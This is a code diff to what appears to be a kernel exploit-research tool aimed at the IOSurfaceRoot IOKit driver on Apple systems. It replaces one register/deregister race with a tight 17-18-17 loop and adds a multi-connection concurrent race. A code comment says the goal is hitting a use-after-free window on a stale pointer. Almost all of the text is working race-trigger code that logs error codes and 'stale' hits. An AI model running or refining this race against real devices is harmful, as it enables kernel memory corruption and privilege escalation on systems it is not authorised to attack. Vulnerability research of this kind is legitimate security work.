@@ -16840,95 +16840,154 @@ new_modes:
                 }
             }
 
-            /* Phase 4: If we found a working format, race it */
-            rlog("\n--- Phase 4: Race register/deregister (if format found) ---\n");
+            /* Phase 4: Tight register/deregister race loop */
+            rlog("\n--- Phase 4: Tight 17-18-17 race with error decode ---\n");
 
-            /* Try the most likely format: async struct 24 bytes */
             uint8_t reg_input[24];
             memset(reg_input, 0, sizeof(reg_input));
             if (surf_id) memcpy(reg_input, &surf_id, 4);
 
+            /* First: verify the cycle works in sequence */
             kr = IOConnectCallAsyncStructMethod(conn, 17,
-                wake_port, reference, 1,
-                reg_input, 24, NULL, NULL);
-            rlog("  Initial register (async 24B): 0x%08x\n", kr);
-
+                wake_port, reference, 1, reg_input, 24, NULL, NULL);
+            rlog("  Verify register: 0x%08x\n", kr);
             if (kr == 0) {
-                /* Deregister */
                 kr = IOConnectCallStructMethod(conn, 18, reg_input, 24, NULL, NULL);
-                rlog("  Deregister: 0x%08x\n", kr);
+                rlog("  Verify deregister: 0x%08x\n", kr);
+            }
 
-                /* Now race: concurrent register/deregister */
-                rlog("  Racing %d rounds...\n", rounds);
+            /* Tight race: register, immediately deregister, re-register
+               The UAF window is between deregister freeing the entry and
+               the async callback accessing the stale pointer */
+            rlog("  Racing %d rounds (tight 17-18-17 pattern)...\n", rounds);
 
-                __block _Atomic int race_ok = 0;
-                __block _Atomic int race_dup = 0;
-                __block _Atomic int race_notattach = 0;
-                __block _Atomic int race_other = 0;
-                __block _Atomic int stale_hits = 0;
-                __block _Atomic int r_stop = 0;
-                __block int r_rounds = rounds;
-                __block io_connect_t r_conn = conn;
-                __block mach_port_t r_port = wake_port;
+            int rc_ok17 = 0, rc_ok18 = 0, rc_dup = 0, rc_bad = 0;
+            int rc_other17 = 0, rc_other18 = 0;
+            uint32_t other_codes[16] = {0};
+            int other_code_cnt = 0;
 
-                dispatch_queue_t reg_q = dispatch_queue_create("reg", NULL);
-                dispatch_queue_t dereg_q = dispatch_queue_create("dereg", NULL);
-
-                dispatch_async(reg_q, ^{
-                    uint8_t inp[24];
-                    memset(inp, 0, 24);
-                    memcpy(inp, &surf_id, 4);
-                    uint64_t ref[1] = {0x42424242};
-
-                    for (int i = 0; i < r_rounds && !r_stop; i++) {
-                        kern_return_t rk = IOConnectCallAsyncStructMethod(r_conn, 17,
-                            r_port, ref, 1, inp, 24, NULL, NULL);
-                        if (rk == 0) race_ok++;
-                        else if (rk == 0xE00002C9) race_dup++;
-                        else if (rk == 0xE00002D8) race_notattach++;
-                        else race_other++;
+            for (int i = 0; i < rounds; i++) {
+                /* Register (async) */
+                kr = IOConnectCallAsyncStructMethod(conn, 17,
+                    wake_port, reference, 1, reg_input, 24, NULL, NULL);
+                if (kr == 0) rc_ok17++;
+                else if (kr == 0xE00002C9) rc_dup++;
+                else {
+                    rc_other17++;
+                    /* Record unique error codes */
+                    int found = 0;
+                    for (int ci = 0; ci < other_code_cnt; ci++) {
+                        if (other_codes[ci] == (uint32_t)kr) { found = 1; break; }
                     }
-                    r_stop = 1;
+                    if (!found && other_code_cnt < 16) other_codes[other_code_cnt++] = (uint32_t)kr;
+                }
+
+                /* Immediately deregister (sync) — this is the race */
+                kern_return_t kr2 = IOConnectCallStructMethod(conn, 18,
+                    reg_input, 24, NULL, NULL);
+                if (kr2 == 0) rc_ok18++;
+                else if (kr2 == 0xE00002C2) rc_bad++;
+                else {
+                    rc_other18++;
+                    int found = 0;
+                    for (int ci = 0; ci < other_code_cnt; ci++) {
+                        if (other_codes[ci] == (uint32_t)kr2) { found = 1; break; }
+                    }
+                    if (!found && other_code_cnt < 16) other_codes[other_code_cnt++] = (uint32_t)kr2;
+                }
+            }
+
+            rlog("  Results: reg_ok=%d dereg_ok=%d dup=%d bad=%d other17=%d other18=%d\n",
+                 rc_ok17, rc_ok18, rc_dup, rc_bad, rc_other17, rc_other18);
+            if (other_code_cnt > 0) {
+                rlog("  Unique other codes:");
+                for (int ci = 0; ci < other_code_cnt; ci++)
+                    rlog(" 0x%08x", other_codes[ci]);
+                rlog("\n");
+            }
+
+            /* Phase 5: Multi-connection race */
+            rlog("\n--- Phase 5: Multi-connection concurrent race ---\n");
+
+            /* Open a second connection */
+            io_service_t svc2 = IOServiceGetMatchingService(kIOMasterPortDefault,
+                IOServiceMatching("IOSurfaceRoot"));
+            io_connect_t conn2 = 0;
+            if (svc2) {
+                kr = IOServiceOpen(svc2, mach_task_self(), 0, &conn2);
+                IOObjectRelease(svc2);
+                rlog("  Second connection: 0x%x (kr=0x%x)\n", conn2, kr);
+            }
+
+            if (conn2) {
+                /* Create a second wake port */
+                mach_port_t wake2 = MACH_PORT_NULL;
+                mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wake2);
+                mach_port_insert_right(mach_task_self(), wake2, wake2, MACH_MSG_TYPE_MAKE_SEND);
+
+                __block _Atomic int mc_ok = 0, mc_dup = 0, mc_stale = 0, mc_other = 0;
+                __block _Atomic int mc_stop = 0;
+                __block int mc_rounds = rounds;
+                __block io_connect_t mc_conn1 = conn, mc_conn2 = conn2;
+                __block mach_port_t mc_port1 = wake_port, mc_port2 = wake2;
+
+                dispatch_queue_t q1 = dispatch_queue_create("mc1", NULL);
+                dispatch_queue_t q2 = dispatch_queue_create("mc2", NULL);
+
+                /* Thread 1: register on conn1, deregister on conn2 */
+                dispatch_async(q1, ^{
+                    uint8_t inp[24]; memset(inp, 0, 24);
+                    memcpy(inp, &surf_id, 4);
+                    uint64_t ref[1] = {0x43434343};
+
+                    for (int i = 0; i < mc_rounds && !mc_stop; i++) {
+                        kern_return_t rk = IOConnectCallAsyncStructMethod(mc_conn1, 17,
+                            mc_port1, ref, 1, inp, 24, NULL, NULL);
+                        if (rk == 0) {
+                            mc_ok++;
+                            /* Immediately deregister from DIFFERENT connection */
+                            kern_return_t dk = IOConnectCallStructMethod(mc_conn2, 18,
+                                inp, 24, NULL, NULL);
+                            if (dk == 0) mc_ok++;
+                            else if (dk == 0xE00002D8) mc_stale++;
+                            else mc_other++;
+                        } else if (rk == 0xE00002C9) mc_dup++;
+                        else mc_other++;
+                    }
+                    mc_stop = 1;
                 });
 
-                dispatch_async(dereg_q, ^{
-                    uint8_t inp[24];
-                    memset(inp, 0, 24);
+                /* Thread 2: register on conn2, deregister on conn1 */
+                dispatch_async(q2, ^{
+                    uint8_t inp[24]; memset(inp, 0, 24);
                     memcpy(inp, &surf_id, 4);
+                    uint64_t ref[1] = {0x44444444};
 
-                    while (!r_stop) {
-                        kern_return_t rk = IOConnectCallStructMethod(r_conn, 18,
-                            inp, 24, NULL, NULL);
-                        if (rk == 0) race_ok++;
-                        else if (rk == 0xE00002C9) race_dup++;
-                        else if (rk == 0xE00002D8) {
-                            race_notattach++;
-                            /* NotAttached after register = possible stale */
-                            stale_hits++;
-                        }
-                        else race_other++;
+                    for (int i = 0; i < mc_rounds && !mc_stop; i++) {
+                        kern_return_t rk = IOConnectCallAsyncStructMethod(mc_conn2, 17,
+                            mc_port2, ref, 1, inp, 24, NULL, NULL);
+                        if (rk == 0) {
+                            mc_ok++;
+                            kern_return_t dk = IOConnectCallStructMethod(mc_conn1, 18,
+                                inp, 24, NULL, NULL);
+                            if (dk == 0) mc_ok++;
+                            else if (dk == 0xE00002D8) mc_stale++;
+                            else mc_other++;
+                        } else if (rk == 0xE00002C9) mc_dup++;
+                        else mc_other++;
                     }
+                    mc_stop = 1;
                 });
 
-                dispatch_sync(reg_q, ^{});
+                dispatch_sync(q1, ^{});
                 usleep(50000);
 
-                rlog("  Race results: ok=%d dup=%d notattach=%d other=%d stale=%d\n",
-                     race_ok, race_dup, race_notattach, race_other, stale_hits);
-            } else {
-                rlog("  Register failed, trying other formats...\n");
+                rlog("  Multi-conn race: ok=%d dup=%d stale=%d other=%d\n",
+                     mc_ok, mc_dup, mc_stale, mc_other);
 
-                /* Try all selectors with scalar inputs to find the right one */
-                for (int sel = 15; sel <= 20; sel++) {
-                    for (int ninp = 1; ninp <= 3; ninp++) {
-                        uint64_t scalars[3] = {surf_id, 0, 0};
-                        kr = IOConnectCallScalarMethod(conn, sel, scalars, ninp,
-                            NULL, NULL);
-                        if (kr != 0xE00002C2) {
-                            rlog("  sel=%d scalar ninp=%d: 0x%08x\n", sel, ninp, kr);
-                        }
-                    }
-                }
+                if (wake2 != MACH_PORT_NULL)
+                    mach_port_deallocate(mach_task_self(), wake2);
+                IOServiceClose(conn2);
             }
 
             mach_port_deallocate(mach_task_self(), wake_port);
